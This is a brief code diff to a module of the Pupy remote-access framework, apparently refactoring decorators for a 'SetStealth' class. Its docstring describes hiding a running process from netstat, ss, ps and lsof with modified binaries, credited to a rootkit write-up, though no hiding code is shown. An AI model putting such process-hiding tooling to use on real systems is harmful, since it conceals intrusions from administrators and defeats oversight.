@@ -3,8 +3,7 @@ from pupylib.PupyModule import *
 
 __class_name__="SetStealth"
 
-@compatibility("unix")
-@category("manage")
+@config(cat="manage", compat="unix")
 class SetStealth(PupyModule):
 	"""Hides the runnin process from netstat, ss, ps, lsof by using modified binaries. Be careful when choosing the port.
 Credits to: http://www.jakoblell.com/blog/2014/05/07/hacking-contest-rootkit/
